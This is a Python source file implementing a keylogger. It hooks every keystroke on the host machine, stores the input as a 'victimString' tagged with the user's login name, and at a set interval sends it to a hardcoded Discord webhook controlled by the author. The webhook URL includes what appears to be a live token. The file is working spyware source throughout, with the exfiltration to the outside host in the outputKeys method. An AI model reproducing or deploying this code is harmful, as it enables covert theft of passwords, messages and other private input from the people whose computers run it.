#Written and designed by Stone Preheim
from threading import Timer

import keyboard
from discord import Webhook, RequestsWebhookAdapter
import os

#will need to post directly to webhook since i want to run in new thread
WEBHOOK = "https://discord.com/api/webhooks/947727566226202634/St1laTDd5koi49lss-IqtYJrcHgYpNrv11pV-ED2g4AYo_yPj_g4K-yLyWzMrZJHXwNk"
webControl = Webhook.from_url(WEBHOOK, adapter=RequestsWebhookAdapter())#didnt need an async adapter here so just using requests

class Keylogger:
    def __init__(self, interval, method="discord", botID = ''):
        self.INTERVAL = interval
        self.method = method
        self.botID = botID
        self.victimString = ''
        self.victimName = os.getlogin()
        self.isRunning = False

    def outputKeys(self):
        """
        this will be changed to output to discord as soon as
        I connect this class with the controller. Also wanting to provide
        support for outputting to file/email in stretch.
        """
        if self.method == 'discord' and self.victimString != '':#can add more output options with this if elif statement.
            webControl.send(username=f'{self.botID}', content=self.victimString)#send content to webhook
        else:
            print(self.victimString)
        self.victimString = ''

    def cleanPresses(self, event):
        """
        going to use this to clean up raw key input and add onto string
        """
        n = event.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "decimal":
                n = '.'
            elif n == "enter":
                n = "[ENTER NEW LINE]\n"
            elif n == "shift":
                n = ''
            elif n == "backspace":
                n = '\n[back]'
            elif n == "ctrl":
                n = '\n[ctrl]'
        if self.isRunning == True:
            self.victimString += n

    def startTimer(self):
        if self.victimString:
            self.outputKeys()
        timer = Timer(interval=self.INTERVAL, function=self.startTimer)
        timer.daemon = True
        timer.start()

    def mainLoop(self):
        keyboard.on_release(callback=self.cleanPresses)
        self.startTimer()
        keyboard.wait()#execute forever thread will close from discord controller eventually

    def stopReading(self):
        print("reading is stopping")
        self.isRunning = False #should allow for thread to exit gracefully
        self.victimString = '' #clear string

    def startReading(self):
        self.isRunning = True
        webControl.send(username=f'{self.botID}', content=f'Bot is starting logging and will send updates every {self.INTERVAL} seconds...')
        self.victimString = ''  # clear string

    def changeInterval(self, newInt = 5):
        self.INTERVAL = newInt


if __name__ == '__main__':
    logger = Keylogger(interval=5)
    logger.mainLoop()
